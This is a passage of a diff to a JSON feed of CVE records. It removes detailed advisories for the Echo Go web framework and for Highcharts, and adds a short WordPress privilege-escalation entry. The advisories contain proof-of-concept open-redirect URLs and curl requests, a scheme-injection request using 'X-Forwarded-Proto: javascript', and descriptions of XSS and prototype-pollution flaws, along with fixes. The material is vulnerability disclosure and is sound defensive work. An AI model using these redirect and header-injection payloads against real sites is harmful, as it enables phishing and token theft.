authority):\n\n```bash\nGOFLAGS=-mod=mod go run .\n```\n\n```\nGET                          code   Location (control chars shown) browser navigates to\n/normal/path/                301    /normal/path           (victim origin)\n                             control: ordinary path, sanitized correctly\n/%09/attacker.example/x/     301    /^I/attacker.example/x attacker.example\n                             exploit: TAB then slash\n/%09%5Cattacker.example/x/   301    /^I\\attacker.example/x attacker.example\n                             exploit: TAB then backslash\n/..%09/attacker.example/     301    /..^I/attacker.example (victim origin)\n                             NOT exploitable: TAB is not at index 1\n/%09//attacker.example/      301    /^I//attacker.example  (victim origin)\n                             NOT exploitable: three slashes is an empty authority\n\nRESULT: reproducible. ...\n```\n\n`^I` is a literal TAB byte. The last two rows are deliberate negatives, included\nso the mechanism (the guard reads only `uri[0]` and `uri[1]`) is unambiguous.\n\nOver the wire, with the `-serve` variant running on `127.0.0.1:18002`:\n\n1. Show the malformed `Location` on the wire. No backslash is needed for this variant:\n\n```bash\ncurl -s -i --max-time 5 'http://127.0.0.1:18002/%09/attacker.example/x/' | cat -A | head -3\n# HTTP/1.1 301 Moved Permanently\n# Location: /^I/attacker.example/x\n```\n\n`cat -A` renders the tab as `^I`, confirming it is a literal byte in the header.\n\n2. Show that LF does NOT work, which proves the mechanism is the guard's fixed\n   byte offsets rather than generic header injection:\n\n```bash\ncurl -s -i --max-time 5 'http://127.0.0.1:18002/%0A/attacker.example/x/' | cat -A | head -3\n# Location: / /attacker.example/x     (net/http rewrote LF to a space)\n```\n\n3. Confirm a browser leaves the origin. Start any HTTP server on port 18099, then\n   open this URL in a browser:\n\n```\nhttp://127.0.0.1:18002/%09/127.0.0.1:18099/x/\n```\n\nObserved in headless Chromium:\n\n```\nfinalUrl: http://127.0.0.1:18099/x\n```\n\nThe browser left the victim origin entirely, so this is a working open redirect,\nnot merely a suspicious header.\n\nExit status `0` means the finding reproduced; `1` means an expectation was\nviolated.\n\n## Impact\n\nAn attacker can craft a link on the victim domain that redirects the victim to an arbitrary external site. Practical consequences:\n\n- Phishing: the trusted domain name appears in the link and in the initial navigation, which defeats the usual \"check the domain\" advice.\n- OAuth and SSO token theft: any flow that permits a redirect target on the trusted origin and relies on that origin's redirects being local can be chained to leak authorization codes or access tokens.\n- Referrer and cache poisoning of downstream logic that treats the victim origin's redirects as trustworthy.\n\nThe client must follow the redirect (user interaction is required), which is why this is scored Medium rather than High, but open redirects on authentication-adjacent origins routinely escalate in practice.\n\n## Recommended fixes\n\nNormalize before deciding, instead of probing two fixed offsets.\n\n```go\nfunc sanitizeURI(uri string) string {\n\t// Strip control characters that browsers remove before parsing, so they cannot\n\t// be used to shift a separator out of the checked positions.\n\turi = strings.Map(func(r rune) rune {\n\t\tif r < 0x20 || r == 0x7f {\n\t\t\treturn -1\n\t\t}\n\t\treturn r\n\t}, uri)\n\t// Collapse any leading separator run (both slash kinds) to a single slash.\n\tif strings.ContainsAny(uri[:min(len(uri), 1)], `/\\`) {\n\t\ttrimmed := strings.TrimLeft(uri, `/\\`)\n\t\tif len(trimmed) != len(uri) {\n\t\t\treturn \"/\" + trimmed\n\t\t}\n\t}\n\treturn uri\n}\n```\n\nAdditional hardening:\n\n1. Reject the request with 400 when the decoded path contains control characters, rather than attempting to sanitize. A path containing a raw TAB or NUL is malformed under RFC 3986 and has no legitimate use.\n2. Apply the same normalization to the `Location` value in `Context.Redirect` so every caller benefits, instead of relying on each call site to call `sanitizeURI`.\n3. Add a regression test for each variant (`%09/`, `%09%5C`, `%0A/`) against both trailing-slash middlewares. There is currently no test that asserts `sanitizeURI` behavior at all.\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. The trailing slash middlewares and the static directory redirect percent-encode control characters in the redirect path before collapsing leading slashes, so a browser can no longer be sent to another host.\n\n## Workarounds\n\nUse the trailing slash middlewares without `RedirectCode` (the default rewrites the path internally instead of redirecting), or reject request paths that contain control characters before these middlewares.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-601",
-        "name": "URL Redirection to Untrusted Site ('Open Redirect')"
-      },
-      "references": [
-        "https://github.com/labstack/echo/security/advisories/GHSA-v753-g4cw-jm48",
-        "https://github.com/labstack/echo/commit/b838391e2eade87ae7e5a09d7bb5087bec271ec1",
-        "https://github.com/labstack/echo/commit/fc410094b2f3415cf2bf5204082137b205bfd5af",
-        "https://github.com/labstack/echo/releases/tag/v4.16.0",
-        "https://github.com/labstack/echo/releases/tag/v5.4.0"
-      ],
-      "vulnerableProducts": [
-        "github.com/labstack/echo/v5 go",
-        "github.com/labstack/echo/v4 go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-118658",
-      "summary": "## Summary\n\nThe `c.Scheme()` method in Echo (`context.go:162-181`) trusts the `X-Forwarded-Proto`, `X-Forwarded-Protocol`, and `X-Url-Scheme` request headers without validating that the value is `http` or `https`. The `WWWRedirect()` and `NonWWWRedirect()` middlewares use this unsanitized scheme to construct redirect URLs, allowing an attacker to inject arbitrary URI schemes into the `Location` response header.\n\n## Affected Components\n\n- `context.go:162-181` - `Scheme()` method returns attacker-controlled value verbatim\n- `middleware/redirect.go:172-184` - `redirectWWW`/`redirectNonWWW` use unsanitized scheme\n\n## Proof of Concept\n\n```\nGET /path HTTP/1.1\nHost: example.com\nX-Forwarded-Proto: javascript\n\nResponse:\nHTTP/1.1 301 Moved Permanently\nLocation: javascript://www.example.com/path\n```\n\nConfirmed injectable schemes: `javascript`, `data`, `vbscript`, `file`, `ftp`, `ssh`, `telnet`, `gopher`.\n\nOnly `WWWRedirect()` and `NonWWWRedirect()` (and `WithConfig` variants) are affected. `HTTPSRedirect`, `HTTPSWWWRedirect`, `HTTPSNonWWWRedirect` are NOT affected (they hardcode `https://`).\n\n## Impact\n\n- Open redirect to arbitrary scheme URLs when app is not behind a proxy that strips `X-Forwarded-Proto`\n- Cache poisoning when behind a CDN that caches redirect responses keyed by path\n- `file://` scheme injection could trigger file access in some browser configurations\n\n## Suggested Fix\n\nWhitelist scheme in `c.Scheme()` to only return `http` or `https`:\n\n```go\nfunc (c *Context) Scheme() string {\n    if c.IsTLS() {\n        return \"https\"\n    }\n    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != \"\" {\n        scheme = strings.ToLower(strings.TrimSpace(scheme))\n        if scheme == \"https\" {\n            return \"https\"\n        }\n    }\n    return \"http\"\n}\n```\n\n## Disclosure\n\nSource code review, manually verified with actual HTTP server. Tested on Echo v5.0.4 (latest master).\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.1.1 and `github.com/labstack/echo/v4` v4.15.2. `Context.Scheme()` now accepts only `http`, `https`, `ws` or `wss` from the `X-Forwarded-Proto`, `X-Forwarded-Protocol` and `X-Url-Scheme` headers, and falls back to `http` for any other value (#2953).\n\n## Workarounds\n\nUpgrade to a patched version. If you cannot upgrade, have your edge proxy overwrite or remove the `X-Forwarded-Proto`, `X-Forwarded-Protocol` and `X-Url-Scheme` request headers.",
-      "cvssScore": 4.7,
-      "severity": "Medium",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-601",
-        "name": "URL Redirection to Untrusted Site ('Open Redirect')"
-      },
-      "references": [
-        "https://github.com/labstack/echo/security/advisories/GHSA-23wf-92cp-8pcj",
-        "https://github.com/labstack/echo/pull/2953",
-        "https://github.com/labstack/echo/commit/ca4f38a474302aabee93c66bdd0052359882e181",
-        "https://github.com/labstack/echo/commit/d1d8ad3f99dd9b80542cd0c357d56a8916c515df",
-        "https://github.com/labstack/echo/releases/tag/v4.15.2"
-      ],
-      "vulnerableProducts": [
-        "github.com/labstack/echo/v5 go",
-        "github.com/labstack/echo/v4 go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-118255",
-      "summary": "### Impact\nAn attacker who controls the Grid configuration can set `credits.href` to a `javascript:` URL. The value is not validated against an allowed-scheme list before it is applied to the credits link, so activating that link runs attacker-supplied script in the origin of the page hosting the Grid. Exploitation requires that untrusted data reach the Grid configuration and that a user activate the credits link. Script running this way has the same access to page data, storage and session state as the hosting application.\n\n### Workarounds\nPaste in after the Grid Pro module is imported, before a Grid is created.\n\n```javascript\nconst { AST } = Grid;\n\nfunction sanitize(options) {\n    const credits = options && options.credits;\n\n    if (credits && typeof credits.href === 'string') {\n        const filtered = AST.filterUserAttributes({ href: credits.href });\n\n        if (!filtered.href) {\n            delete credits.href;\n        }\n    }\n\n    return options;\n}\n\n// Both Grid.grid() and grid.update() funnel through loadUserOptions, so one\n// hook covers both entry points.\nconst { prototype } = Grid.Grid;\nconst loadUserOptions = prototype.loadUserOptions;\n\nprototype.loadUserOptions = function (options, ...rest) {\n    sanitize(options);\n    return loadUserOptions.call(this, options, ...rest);\n};\n```\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install @highcharts/grid-lite@3.2.0`. If you load Highcharts Grid from a CDN, use a versioned URL, for example `https://cdn.jsdelivr.net/npm/@highcharts/grid-lite@3.2.0/grid-lite.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/grid/installation).",
-      "cvssScore": 8.4,
-      "severity": "High",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/highcharts/highcharts/security/advisories/GHSA-6hgp-fmhr-mrg4",
-        "https://github.com/highcharts/highcharts/pull/25351",
-        "https://github.com/highcharts/highcharts/commit/45b74403acafbe9f621c4a343506721d9129e991",
-        "https://github.com/highcharts/highcharts/releases/tag/grid-v3.2.0",
-        "https://github.com/advisories/GHSA-6hgp-fmhr-mrg4"
-      ],
-      "vulnerableProducts": [
-        "@highcharts/dashboards npm",
-        "@highcharts/grid-pro npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-118254",
-      "summary": "### Impact\nThe pagination language strings are written into the DOM as markup rather than as text. An attacker who controls those language options can supply elements carrying event handlers, and those handlers execute in the origin of the page hosting the Grid when the pagination controls render. Exploitation requires that untrusted data reach the Grid language configuration and that pagination be enabled on the Grid.\n\n### Workarounds\nRun this once after loading the Grid, before creating any grid:\n```javascript\n{\n    const Pagination = Grid.Pagination;\n\n    const escapeLang = (pagination) => {\n        const lang = pagination.lang;\n        if (!lang) {\n            return;\n        }\n\n        for (const key of ['pageInfo', 'pageSizeLabel']) {\n            if (typeof lang[key] === 'string') {\n                lang[key] = lang[key].replace(/</g, '&lt;');\n            }\n        }\n    };\n\n    for (const name of ['updatePageInfo', 'renderPageSizeSelector']) {\n        const original = Pagination.prototype[name];\n\n        Pagination.prototype[name] = function (...args) {\n            escapeLang(this);\n            return original.apply(this, args);\n        };\n    }\n}\n```\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install @highcharts/grid-lite@3.2.0`. If you load Highcharts Grid from a CDN, use a versioned URL, for example `https://cdn.jsdelivr.net/npm/@highcharts/grid-lite@3.2.0/grid-lite.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/grid/installation).",
-      "cvssScore": 8.6,
-      "severity": "High",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/highcharts/highcharts/security/advisories/GHSA-r5wg-q8fc-p6w2",
-        "https://github.com/highcharts/highcharts/commit/1e8ded84d52191883965641b863cf0c73eb759aa",
-        "https://github.com/highcharts/highcharts/releases/tag/grid-v3.2.0",
-        "https://github.com/advisories/GHSA-r5wg-q8fc-p6w2"
-      ],
-      "vulnerableProducts": [
-        "@highcharts/grid-lite npm",
-        "@highcharts/grid-pro npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-118253",
-      "summary": "### Impact\nThe edit mode fullscreen labels are parsed as HTML when the corresponding control is rendered. An attacker who controls the Dashboards language options can supply markup carrying event handlers, which then execute in the origin of the page hosting the dashboard. Exploitation requires that untrusted data reach the Dashboards language configuration and that the affected control be rendered. Script running this way has the same access to page data, storage and session state as the hosting application.\n\n### Workarounds\n\nUntil you can upgrade, replace `Fullscreen.prototype.setButtonText` atapplication startup. The replacement is the original method with `textContent` in place of `innerHTML`.\n\n#### If you install Dashboards from npm\n\nImport the module once, before any board is created.\n\n```js\nimport Fullscreen from '@highcharts/dashboards/es-modules/Dashboards/EditMode/Fullscreen.js';\n\nFullscreen.prototype.setButtonText = function () {\n    const editMode = this.board.editMode,\n        button = editMode?.tools.contextMenu?.items.viewFullscreen;\n\n    if (button?.innerElement) {\n        const lang = editMode.lang;\n\n        button.innerElement.textContent =\n            (this.isOpen ? lang.exitFullscreen : lang.viewFullscreen) || '';\n    }\n};\n```\n\n#### If you load Dashboards from a `<script>` tag\n\nThe same replacement, taking `Fullscreen` from the global namespace. It must run after `modules/layout` and before any board is created.\n\n```html\n<script src=\"https://code.highcharts.com/dashboards/dashboards.js\"></script>\n<script src=\"https://code.highcharts.com/dashboards/modules/layout.js\"></script>\n<script>\n{\n    const Fullscreen = window.Dashboards?.Fullscreen;\n\n    Fullscreen.prototype.setButtonText = function () {\n        const editMode = this.board.editMode,\n            button = editMode?.tools.contextMenu?.items.viewFullscreen;\n\n        if (button?.innerElement) {\n            const lang = editMode.lang;\n\n            button.innerElement.textContent =\n                (this.isOpen ? lang.exitFullscreen : lang.viewFullscreen) || '';\n        }\n    };\n}\n</script>\n```\n\nIf your application does not need Edit Mode, leaving it disabled (`editMode.enabled: false`) removes the exposure as well. The same applies to the context menu — the label is only reachable when `viewFullscreen` is among `editMode.contextMenu.items`.\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install @highcharts/dashboards@4.2.3`. If you load Highcharts Dashboards from a CDN, use a versioned URL, for example `https://code.highcharts.com/dashboards/4.2.3/dashboards.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/dashboards/installation).",
-      "cvssScore": 8.4,
-      "severity": "High",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/highcharts/highcharts/security/advisories/GHSA-58g7-7f52-h92c",
-        "https://github.com/highcharts/highcharts/commit/f97213bab745e40f628720c21f4e8b31ee3e768b",
-        "https://github.com/highcharts/highcharts/releases/tag/dashboards-v4.2.3",
-        "https://github.com/advisories/GHSA-58g7-7f52-h92c"
-      ],
-      "vulnerableProducts": [
-        "@highcharts/dashboards npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-118252",
-      "summary": "### Impact\nThe component language strings shown in the edit mode sidebar are parsed as HTML rather than inserted as text. An attacker who controls those language options can supply markup carrying event handlers, which execute in the origin of the page hosting the dashboard once the sidebar renders the affected labels. Exploitation requires that untrusted data reach the Dashboards language configuration and that a user open the edit mode sidebar.\n\n### Workarounds\n\nUntil you can upgrade, patch `EditMode` once at application startup. The hook runs before the sidebar is built, so the labels are already harmless by the time they are rendered. Assigning a string to `textContent` and reading back `innerHTML` turns any markup into literal text, which is exactly what the fixed version renders.\n\nAfter importing the module, use this code snipped once, before any board is created.\n\n```js\n{\n    const EditMode = window.Dashboards?.EditMode;\n    const escapeHTML = (text) => text\n        .replace(/&/g, '&amp;')\n        .replace(/</g, '&lt;')\n        .replace(/>/g, '&gt;');\n    const patched = new WeakSet();\n    const originalInit = EditMode.prototype.init;\n\n    EditMode.prototype.init = function (...args) {\n        const labels = this.lang?.sidebar;\n\n        if (labels && !patched.has(this)) {\n            patched.add(this);\n\n            for (const key of Object.keys(labels)) {\n                if (typeof labels[key] === 'string') {\n                    labels[key] = escapeHTML(labels[key]);\n                }\n            }\n        }\n\n        return originalInit.apply(this, args);\n    };\n}\n```\n\nIf your application does not need Edit Mode, leaving it disabled (`editMode.enabled: false`) removes the exposure as well.\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install @highcharts/dashboards@4.2.3`. If you load Highcharts Dashboards from a CDN, use a versioned URL, for example `https://code.highcharts.com/dashboards/4.2.3/dashboards.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/dashboards/installation).",
-      "cvssScore": 8.4,
-      "severity": "High",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/highcharts/highcharts/security/advisories/GHSA-rcqf-f6h2-ccg9",
-        "https://github.com/highcharts/highcharts/commit/e65f8c21b9974dcccfa1c600a375d836acef4a7d",
-        "https://github.com/highcharts/highcharts/releases/tag/dashboards-v4.2.3",
-        "https://github.com/advisories/GHSA-rcqf-f6h2-ccg9"
-      ],
-      "vulnerableProducts": [
-        "@highcharts/dashboards npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-118251",
-      "summary": "### Impact\nA `credits.href` value beginning with `javascript:` is assigned to the window location when the credits label is clicked, without being checked against an allowed-scheme list. An attacker who controls the chart configuration can therefore run script in the origin of the page hosting the chart. Exploitation requires that untrusted data reach the chart configuration and that a user click the credits label. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\nDrop-in fix - for any versions affected (5.0.0-13.0.2).\nAdd the below IIFE to run after Highcharts is loaded, but before a chart is created.\n\n```js\n!function(t){if(t&&t.Chart&&!t.Chart.prototype.creditsHrefPatched){var r=t.Chart.prototype,e=r.addCredits;r.addCredits=function(n){var o=t.merge(!0,this.options.credits,n);return o&&o.href&&!c(o.href)&&delete o.href,e.call(this,o)},r.creditsHrefPatched=!0}function c(r){var e=t.AST&&t.AST.allowedReferences||[\"https://\",\"http://\",\"mailto:\",\"/\",\"../\",\"./\",\"#\"];return\"string\"==typeof r&&e.some(function(t){return 0===r.indexOf(t)})}}(Highcharts);\n```\n[Live demo & testing](https://jsfiddle.net/BlackLabel/6a09ws1f/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@ 13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
-      "cvssScore": 8.4,
-      "severity": "High",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/highcharts/highcharts/security/advisories/GHSA-5793-x2q3-c3q7",
-        "https://github.com/highcharts/highcharts/pull/25315",
-        "https://github.com/highcharts/highcharts/commit/9534773d0f41400aac0945bf8aaebc38dfc72aff",
-        "https://github.com/highcharts/highcharts/releases/tag/v13.1.0",
-        "https://github.com/advisories/GHSA-5793-x2q3-c3q7"
-      ],
-      "vulnerableProducts": [
-        "highcharts npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-118250",
-      "summary": "### Impact\nA dot-separated key path taken from `series.keys` is followed without filtering the individual segments. An attacker who controls `series.keys` and the matching point data can use a path such as `__proto__.polluted` to set arbitrary properties on `Object.prototype`. The resulting properties are visible to all JavaScript running in the page, not only to the chart. No user interaction is required beyond rendering the chart.\n\nThe injected properties are inert until other code on the page reads them, so consequences depend on the consuming application.\n\n### Workarounds\nDrop-in fix - for any versions affected (6.1.0-13.0.2). Add the below IIFE to run after Highcharts is loaded.\n\n```javascript\n((H)=>{const X = H.isObject;H.Point.prototype.setNestedProperty = function setNestedProperty(t,e,i){let s=i.split(\".\");return s.some(t=>\"__proto__\"===t||\"constructor\"===t)||s.reduce(function(t,i,s,o){let r=o.length-1===s;return t[i]=r?e:X(t[i],!0)?t[i]:{},t[i]},t),t};})(Highcharts);\n```\n\n[Live demo & testing](https://jsfiddle.net/BlackLabel/z3rbtm7u/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.1`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.1/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-1321",
-        "name": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
-      },
-      "references": [
-        "https://github.com/highcharts/highcharts/security/advisories/GHSA-rmqc-xvr3-v46c",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-118250",
-        "https://github.com/highcharts/highcharts/pull/25313",
-        "https://github.com/highcharts/highcharts/commit/fd4ee8140732618bbe71295aba55398fb1f8fa9e",
-        "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
-      ],
-      "vulnerableProducts": [
-        "highcharts npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-118249",
-      "summary": "### Impact\nWhen series columns are built from point objects, the point option keys are used directly as data column ids, so the write that populates a column reaches `Object.prototype` and the `Object` constructor. Keys named `__proto__` and `constructor` survive `JSON.parse` as own enumerable properties, so an attacker who controls the point objects can set integer-keyed properties on `Object.prototype`, one per point index, to values of their choosing. Named properties cannot be reached this way. The integer keys still affect every object in the page: reading an out-of-range index on any array or plain object returns the attacker's value, and `for...in` over any object yields the injected keys, so unrelated code can take branches it should not using attacker-supplied data, and rendering can fail as a side effect. The properties remain in place once the chart has been built, and no user interaction is required beyond rendering the chart.\n\nConsequences beyond disruption depend on the consuming application.\n\n### Workarounds\nDrop-in fix - for any versions affected (6.1.0-13.0.2).\nAdd the below IIFE to run after Highcharts is loaded.\n\n```javascript\n;!function(t){if(t&&t.Point&&!t.Point.prototype.protoPollutionPatched){var o=t.Point.prototype,r=o.optionsToObject,e=o.setNestedProperty,n=Object.prototype.hasOwnProperty;o.optionsToObject=function(t){if(t&&\"object\"==typeof t&&!Array.isArray(t)&&(n.call(t,\"__proto__\")||n.call(t,\"constructor\"))){var o={};for(var e in t)n.call(t,e)&&!c(e)&&(o[e]=t[e]);t=o}return r.call(this,t)},o.setNestedProperty=function(t,o,r){return String(r).split(\".\").some(c)?t:e.call(this,t,o,r)},o.protoPollutionPatched=!0}function c(t){return\"__proto__\"===t||\"constructor\"===t}}(Highcharts);\n```\n\n[Live demo & testing](https://jsfiddle.net/BlackLabel/nopc6vhj/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+      "id": "CVE-2026-87759",
+      "summary": "The Add User Autocomplete WordPress plugin before 1.2 does not perform any capability or nonce check before creating a pending site-membership invitation carrying a caller-supplied role, allowing any authenticated user, such as a subscriber, to grant themselves the administrator role on a multisite installation.",
       "cvssScore": 7.1,
       "severity": "High",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-1321",
-        "name": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
-      },
-      "references": [
-        "https://github.com/highcharts/highcharts/security/advisories/GHSA-gfvx-2c2g-38wq",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-118249",
-        "https://github.com/highcharts/highcharts/pull/25321",
-        "https://github.com/highcharts/highcharts/commit/d3357705c8f348904441327e32f50ab528c3a205",
-        "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
-      ],
-      "vulnerableProducts": [
-        "highcharts npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-118246",
-      "summary": "### Impact\nThe breadcrumbs `style` option is applied to the breadcrumb button as SVG attributes rather than as CSS, and the attribute names are not filtered. An attacker who controls the chart configuration can supply keys under `breadcrumbs.style` that name event handlers, and those keys become live handlers on the breadcrumb button, so the attacker's script runs in the origin of the page hosting the chart. The option is reached through `drilldown.breadcrumbs`, `navigation.breadcrumbs` and the `breadcrumbs` option of the treemap, sunburst and treegraph series. Exploitation requires that untrusted data reach the chart configuration and that a user drill down, or traverse into a level of a hierarchical series, so that the breadcrumbs render, and then hover over or activate the breadcrumb button. Charts rendered in styled mode do not apply the option and are not affected. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.\n\n### Workarounds\nVerified against published bundles on 10.0.0, 11.4.8, 12.3.0 and 13.0.2.\n\nLoad immediately after Highcharts, before any chart is created:\n\n```js\n// Workaround fix for all affected Highcharts versions: 10.0.0-13.0.2\n((H)=>{const S=H.SVGElement.prototype,D=S._defaultSetter;S._defaultSetter=function _defaultSetter(v,k,e){/^on/i.test(k)||D.call(this,v,k,e)};})(Highcharts);\n// End of the workaround fix\n```\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
-      "cvssScore": 8.4,
-      "severity": "High",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/highcharts/highcharts/security/advisories/GHSA-35rr-xwfh-x789",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-118246",
-        "https://github.com/highcharts/highcharts/commit/b0fafdaaee7d0cac2ecfeb0eaf37b11cd40594ef",
-        "https://github.com/highcharts/highcharts/releases/tag/v13.1.0",
-        "https://github.com/advisories/GHSA-35rr-xwfh-x789"
-      ],
-      "vulnerableProducts": [
-        "highcharts npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1080",
-      "summary": "Quake 1 (quake1) and ProQuake 1.01 and earlier allow remote attackers to cause a denial of service via a malformed (empty) UDP packet.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-11-01",
-      "modified": null,
+      "published": "2026-09-12",
+      "modified": "2026-09-12",
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=97318797630246&w=2",
-        "http://proquake.ai.mit.edu/",
-        "http://www.securityfocus.com/bid/1900",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5527",
-        "http://marc.info/?l=bugtraq&m=97318797630246&w=2"
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-87759",
+        "https://wpscan.com/vulnerability/41020730-c79a-43b4-a902-3a34fdca90d6"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0410",
-      "summary": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: none.  Reason: This candidate was withdrawn by its CNA.  Further investigation showed that it was not a security issue.  Notes: none",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0150",
-      "summary": "Buffer overflow in Internet Information Server (IIS) 4.0, 5.0, and 5.1 allows remote attackers to spoof the safety check for HTTP headers and cause a denial of service or execute arbitrary code via HTTP header field values.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-04-22",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.cert.org/advisories/CA-2002-09.html",
-        "http://www.cisco.com/warp/public/707/Microsoft-IIS-vulnerabilities-MS02-018.shtml",
-        "http://www.iss.net/security_center/static/8797.php",
-        "http://www.kb.cert.org/vuls/id/454091",
-        "http://www.osvdb.org/3316"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0152",
-      "summary": "Buffer overflow in various Microsoft applications for Macintosh allows remote attackers to cause a denial of service (crash) or execute arbitrary code by invoking the file:// directive with a large number of / characters, which affects Internet Explorer 5.1, Outlook Express 5.0 through 5.0.2, Entourage v. X and 2001, PowerPoint v. X, 2001, and 98, and Excel v. X and 2001 for Macintosh.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2002-04-22",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=101897994314015&w=2",
-        "http://www.iss.net/security_center/static/8850.php",
-        "http://www.osvdb.org/5357",
-        "http://www.securityfocus.com/bid/4517",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-019"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0758",
-      "summary": "Directory traversal vulnerability in Shambala 4.5 allows remote attackers to escape the FTP root directory via \"CWD ...\"  command.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-10-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securiteam.com/windowsntfocus/5SP011P4KC.html",
